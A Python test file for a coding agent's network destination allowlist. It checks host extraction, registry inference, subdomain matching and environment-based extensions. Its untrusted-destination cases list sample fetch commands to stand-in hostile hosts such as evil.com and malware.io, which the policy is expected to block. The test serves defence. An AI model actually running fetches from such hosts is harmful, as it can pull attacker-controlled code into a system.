"""Tests for the network destination allowlist policy."""

import pytest

from superqode.agent.network_policy import (
    DEFAULT_ALLOWED_DOMAINS,
    check_network,
    extract_hosts,
    load_allowlist,
)


def test_extract_hosts_from_urls_and_scp():
    assert extract_hosts("curl https://example.com/x") == ["example.com"]
    assert extract_hosts("git clone git@github.com:owner/repo.git") == ["github.com"]
    assert extract_hosts("curl https://user:pw@host.io/x") == ["host.io"]
    assert extract_hosts("ls -la") == []


def test_implicit_registry_inference():
    assert extract_hosts("pip install requests") == ["files.pythonhosted.org"]
    assert extract_hosts("npm install") == ["registry.npmjs.org"]
    assert extract_hosts("cargo add serde") == ["crates.io"]


@pytest.mark.parametrize(
    "command",
    [
        "pip install requests",
        "npm install",
        "git clone https://github.com/x/y",
        "curl https://files.pythonhosted.org/packages/x",
        "curl https://raw.githubusercontent.com/a/b/main/f",
    ],
)
def test_trusted_destinations(command):
    assert check_network(command).status == "trusted"


@pytest.mark.parametrize(
    "command",
    ["curl https://evil.com/x", "wget http://malware.io/p", "curl https://1.2.3.4/x"],
)
def test_untrusted_destinations(command):
    verdict = check_network(command)
    assert verdict.status == "untrusted"
    assert verdict.blocked


def test_unknown_when_no_host():
    assert check_network("git push").status == "unknown"
    assert check_network("ls").status == "unknown"


def test_subdomain_matching():
    # A subdomain of an allowed domain is allowed.
    assert check_network("curl https://cdn.github.com/x").status == "trusted"


def test_env_extends_allowlist(monkeypatch):
    monkeypatch.setenv("SUPERQODE_NET_ALLOW", "internal.corp,mirror.local")
    allow = load_allowlist()
    assert "internal.corp" in allow
    assert "mirror.local" in allow
    assert DEFAULT_ALLOWED_DOMAINS <= allow
    assert check_network("curl https://internal.corp/x", allow).status == "trusted"
